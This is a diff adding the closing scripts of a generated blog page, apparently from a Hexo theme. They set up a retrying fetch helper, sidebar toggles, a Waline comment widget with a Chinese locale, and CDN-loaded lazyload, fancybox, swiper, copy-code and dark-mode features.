+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
